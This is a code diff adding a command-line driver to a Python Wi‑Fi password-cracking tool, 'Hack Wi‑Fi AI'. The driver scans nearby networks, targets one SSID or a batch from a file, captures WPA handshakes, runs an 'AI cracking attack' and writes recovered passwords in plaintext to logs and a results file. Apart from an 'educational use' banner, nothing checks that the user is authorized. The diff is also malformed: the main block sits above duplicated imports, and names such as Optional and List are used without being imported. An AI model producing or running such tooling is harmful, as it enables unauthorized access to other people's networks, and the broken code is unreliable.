@@ -6,6 +6,103 @@ Educational Use Only - Authorized Testing Required
 """
 
 import os
+import argparse
+import json
+import logging
+from pathlib import Path
+
+def configure_logging(log_path: Optional[str] = None) -> None:
+    """Configure console + optional file logging for the Wi‑Fi tool."""
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+    console = logging.StreamHandler()
+    console.setFormatter(formatter)
+    logger.addHandler(console)
+    if log_path:
+        file_handler = logging.FileHandler(log_path, encoding='utf-8')
+        file_handler.setFormatter(formatter)
+        logger.addHandler(file_handler)
+
+def save_result(ssid: str, password: Optional[str], out_path: Optional[str]) -> None:
+    """Append a JSON line with the cracking result for one SSID."""
+    entry = {
+        'ssid': ssid,
+        'found': password is not None,
+        'password': password,
+    }
+    if out_path:
+        try:
+            with open(out_path, 'a', encoding='utf-8') as f:
+                f.write(json.dumps(entry) + '\n')
+        except Exception as e:
+            logging.error(f"Failed to write result to {out_path}: {e}")
+    else:
+        logging.info(f"Result for {ssid}: {entry}")
+
+def main_cli() -> None:
+    parser = argparse.ArgumentParser(description='AI‑powered Wi‑Fi security testing tool (real‑mode)')
+    parser.add_argument('--interface', help='Wi‑Fi interface to use (auto‑detect if omitted)')
+    parser.add_argument('--output', help='Path to JSON‑lines result file')
+    parser.add_argument('--log', help='Path to log file')
+    parser.add_argument('--wordlist', help='Path to save the AI‑generated wordlist (optional)')
+    parser.add_argument('--ssid-file', help='Path to a file containing SSIDs (one per line) for batch testing')
+    args = parser.parse_args()
+
+    configure_logging(args.log)
+    logging.info('Starting Hack Wi‑Fi AI')
+
+    wifi_tool = HackWifiAI()
+    iface = args.interface if args.interface else wifi_tool.setup_environment()
+    if not iface:
+        logging.error('Failed to set up environment')
+        return
+
+    networks = wifi_tool.scan_networks()
+    if not networks:
+        logging.error('No networks discovered')
+        return
+
+    target_ssids: List[str] = []
+    if args.ssid_file:
+        try:
+            with open(args.ssid_file, 'r', encoding='utf-8') as f:
+                target_ssids = [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            logging.error(f"Unable to read SSID file {args.ssid_file}: {e}")
+            return
+    else:
+        # Interactive selection fallback
+        if not wifi_tool.select_target(networks):
+            logging.error('Target selection failed')
+            return
+        target_ssids = [wifi_tool.target_network.ssid]
+
+    for ssid in target_ssids:
+        # Find matching network object
+        network_obj = next((n for n in networks if n.ssid == ssid), None)
+        if not network_obj:
+            logging.warning(f"SSID '{ssid}' not found in scan results – skipping")
+            continue
+        wifi_tool.target_network = network_obj
+        logging.info(f"Testing SSID: {ssid}")
+        if not wifi_tool.capture_handshake(iface):
+            logging.warning(f"Handshake capture failed for {ssid}")
+            save_result(ssid, None, args.output)
+            continue
+        password = wifi_tool.ai_cracking_attack()
+        if password:
+            logging.info(f"✅ Password recovered for {ssid}: {password}")
+        else:
+            logging.info(f"❌ Password not recovered for {ssid}")
+        save_result(ssid, password, args.output)
+
+if __name__ == '__main__':
+    main_cli()
+
+import argparse
+import json
+import logging
 import sys
 import time
 from pathlib import Path
